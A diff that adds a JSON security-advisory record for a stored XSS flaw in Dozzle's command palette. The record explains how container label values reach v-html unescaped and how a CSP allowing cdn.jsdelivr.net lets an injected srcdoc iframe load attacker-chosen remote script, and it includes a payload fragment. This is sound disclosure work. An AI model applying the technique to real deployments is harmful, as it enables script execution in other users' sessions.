@@ -1,0 +1,45 @@
+{
+  "id": "GHSA-8683-6wwr-q7rq",
+  "aliases": [],
+  "title": "Dozzle: stored HTML injection to XSS in the command palette via container label values, escalated to script execution by a CSP that allows cdn.jsdelivr.net",
+  "summary": "## Summary\r\n\r\nContainer label values reach Dozzle's command palette through `v-html` with no HTML escaping, so anyone who can start a container on a monitored host can store arbitrary HTML that executes in the Dozzle origin of every user who uses the palette; the deployed CSP has no `script-src` and falls back to a `default-src` that allowlists cdn.jsdelivr.net, so an injected same-origin srcdoc iframe loads attacker-chosen remote JavaScript. Reproduced end-to-end on `amir20/dozzle:v11.1.1`: the remote script executed inside the injected iframe (`iframeOriginEq:true`, `jq:true`), while a single-label control stayed inert and inline `onerror=` handlers were CSP-blocked.\r\n\r\n## Details\r\n\r\n**Call chain.**\r\n\r\n1. `assets/models/Container.ts:140-147`: `get namespace()` returns the first non-empty of the label values `dev.dozzle.group`, `coolify.projectName`, `com.docker.stack.namespace`, `com.docker.compose.project`; `assets/stores/swarm.ts:27,57`: `Service` name is the `com.docker.swarm.service.name` label value. Docker does not character-restrict label values.\r\n2. `assets/stores/swarm.ts:12-51` (stacks) and `:53-71` (services) feed `assets/components/search/FuzzySearchModal.vue:300-334`, which pushes `name` into the palette item list.\r\n3. `assets/components/search/FuzzySearchModal.vue:103`: `v-html=\"matchedName(entry.result)\"`; `matchedName` (`:574-591`) concatenates `item.name` slices with `<mark>` wrappers and returns them with no HTML escaping (the no-match branch returns `item.name` raw). Vue `v-html` assigns to `innerHTML` verbatim.\r\n4. Trigger: the victim opens the search/command palette (`assets/layouts/default.vue:46`) and types a matching query, or the poisoned stack/service appears in the empty-query recents row (`FuzzySearchModal.vue:383-391`).\r\n5. CSP escalation (`internal/web/csp.go:11`): the served policy is `default-src 'self' 'wasm-unsafe-eval' blob: https://cdn.jsdelivr.net https://*.duckdb.org; style-src 'self' 'unsafe-inline' blob:; ...` with no `script-src`, so script-src falls back to default-src, which allows `https://cdn.jsdelivr.net` (present only for the duckdb-wasm bundle). Inline `onerror=` handlers are CSP-blocked, and a `<script src>` inserted directly via innerHTML does not execute per the HTML spec - but an injected `<iframe srcdoc=\"...\">` creates a fresh same-origin document that inherits the parent CSP, inside which `<script src=\"https://cdn.jsdelivr.net/npm/<attacker-package>/x.js\">` loads and runs. Allowing an open user-content CDN as a script source is a documented CSP anti-pattern.\r\n\r\n**Contrast with the protected sibling sinks.** The codebase escapes HTML at its other render paths - `internal/web/search/escape.go` escapes server-side (the escape-then-mark order `matchedName` should mirror), `ComplexLogItem` values are server-escaped, `ContainerEventLogItem` uses static strings, and the GHSA-v879-vjhp-gmhc remediation added exactly this kind of sanitization to the log-message sink. `matchedName` is the only container-controlled sink found that feeds `v-html` with no escaping step, so escaping at sinks is clearly the design intent and this path skips it. No overlap with the agent/label-filter advisories (GHSA-m855, GHSA-xcw9, GHSA-r9cj), which concern server-side authorization, and the GHSA-v879-vjhp-gmhc remediation does not touch label metadata or this client palette sink.\r\n\r\n**First bad commit.** Two commits matter. The unescaped sink is as old as the palette component: commit `9447b1e` (2024-06-10, \"feat: display top 10 in fuzzysearch (#3023)\") created `assets/components/FuzzySearchModal.vue` already containing `v-html=\"matchedName(...)\"`. The script-execution escalation requires the CSP change from commit `90b9d9768583b651a74357985e23183f7311342e` (2024-09-19, \"feat: duckdb wasm capibility (#3272)\"), which added `https://cdn.jsdelivr.net` to `default-src` in `internal/web/csp.go` - the later of the two, and therefore the first bad commit for this advisory. `git tag --contains` puts the fi...",
+  "published_at": "2026-10-04T23:58:40.000Z",
+  "modified_at": "2026-10-04T23:58:40.000Z",
+  "severity": {
+    "level": "medium",
+    "score": 6.1,
+    "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+    "source": "ghsa"
+  },
+  "kev": {
+    "listed": false,
+    "added_at": null,
+    "checked": true
+  },
+  "epss": null,
+  "cwes": [
+    "CWE-79"
+  ],
+  "affected": [
+    {
+      "product": "dozzle",
+      "ranges": []
+    }
+  ],
+  "references": [
+    {
+      "url": "https://github.com/amir20/dozzle/security/advisories/GHSA-8683-6wwr-q7rq",
+      "type": "advisory"
+    }
+  ],
+  "sources": [
+    {
+      "type": "ghsa",
+      "id": "GHSA-8683-6wwr-q7rq",
+      "url": "https://github.com/amir20/dozzle/security/advisories/GHSA-8683-6wwr-q7rq",
+      "license": "CC-BY-4.0"
+    }
+  ],
+  "revision": "sha256:b8dc576aebdcf6f5ef394b0c63b67eeaa1aea7d6e943033d157ea9ad6f6bb586",
+  "note": null
+}
